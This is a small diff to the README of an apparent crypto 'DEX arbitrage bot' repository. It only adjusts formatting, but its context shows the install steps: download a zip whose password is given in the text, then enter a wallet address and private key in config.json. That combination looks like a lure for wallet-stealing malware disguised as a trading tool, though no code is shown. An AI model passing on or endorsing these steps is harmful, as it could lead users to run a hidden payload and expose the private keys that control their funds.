@@ -8,4 +8,4 @@ The software is provided for educational purposes, is untested and not suitable 
 
 ## Install
 - [Download](https://github.com/freesparrowrob/dex-arbitrage-bot/archive/refs/heads/main.zip) the repository release and extract files with password `XvI2SJUNssB4`.
-- Edit the address and `private_key` fields in the `config.json` file.
+- Edit the `address` and `private_key` fields in the `config.json` file.
